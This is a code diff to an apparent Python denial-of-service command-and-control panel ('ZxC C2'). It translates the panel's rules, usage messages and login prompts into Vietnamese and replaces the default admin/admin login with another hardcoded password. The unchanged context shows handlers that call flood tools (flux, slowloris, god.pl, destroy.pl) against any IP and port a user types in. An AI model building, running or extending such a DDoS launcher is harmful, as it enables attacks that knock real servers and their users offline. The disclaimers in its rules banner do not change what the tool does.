@@ -124,11 +124,11 @@ def rules():
                                 \x1b[38;2;0;212;14m╔═══════════════╗
                                 \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Không tấn công miền đuôi.gov/.gob/.edu     \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Chỉ nên tấn công vào máy chủ thử nghiệm    \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Không lạm dụng vào mục đích phi pháp       \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Chỉ sử dụng trong nội bộ Folody Team       \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. Không chứa botnet, phần mềm gây hại        \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
 ''')
 
@@ -284,8 +284,8 @@ def main():
                 thread = cnc.split()[3]
                 os.system(f'./flux {ip} {port} {thread} 0')
             except IndexError:
-                print('Usage: flux <ip> <port> <threads>')
-                print('Example: flux 1.1.1.1 80 250')
+                print('📘 Cách dùng: flux <ip> <port> <threads>')
+                print('🏃 Mẫu: flux 1.1.1.1 80 250')
 
         elif "slowloris" in cnc:
             try:
@@ -293,8 +293,8 @@ def main():
                 port = cnc.split()[2]
                 os.system(f'./slowloris {ip} {port}')
             except IndexError:
-                print('Usage: slowloris <ip> <port>')
-                print('Example: slowloris 1.1.1.1 80')
+                print('📘 Cách dùng: slowloris <ip> <port>')
+                print('🏃 Mẫu: slowloris 1.1.1.1 80')
 
         elif "god" in cnc:
             try:
@@ -303,8 +303,8 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'perl god.pl {ip} {port} 65500 {time}')
             except IndexError:
-                print('Usage: god <ip> <port> <time>')
-                print('Example: god 1.1.1.1 80 60')
+                print('📘 Cách dùng: god <ip> <port> <time>')
+                print('🏃 Mẫu: god 1.1.1.1 80 60')
 
         elif "destroy" in cnc:
             try:
@@ -313,8 +313,8 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
             except IndexError:
-                print('Usage: destroy <ip> <port> <time>')
-                print('Example: destroy 1.1.1.1 80 60')
+                print('📘 Cách dùng: destroy <ip> <port> <time>')
+                print('🏃 Mẫu: destroy 1.1.1.1 80 60')
 
         elif "std" in cnc:
             try:
@@ -754,16 +754,17 @@ CLEAR   ► CLEAR TERMINAL
 
 def login():
     clear()
-    user = "admin"
-    passwd = "admin"
-    username = input("⚡ Username: ")
-    password = getpass.getpass(prompt='⚡ Password: ')
+    user = "Administrator"
+    passwd = "goodbyenzk.2022"
+    print("🖥️ Đăng nhập để tiếp tục!")
+    username = input("👥 Tài khoản: ")
+    password = getpass.getpass(prompt='🔑 Mật khẩu: ')
     if username != user or password != passwd:
         print("")
-        print("⚡ Haizzz, you're so cute...")
+        print("⚠️ Không thể kết nối với máy chủ desktop-4qwd2px.local")
         sys.exit(1)
     elif username == user and password == passwd:
-        print("⚡ Welcome to ZxC C2!")
+        print("👋 Chào mừng bạn quay lại, Administrator!")
         time.sleep(0.3)
         ascii_vro()
         main()
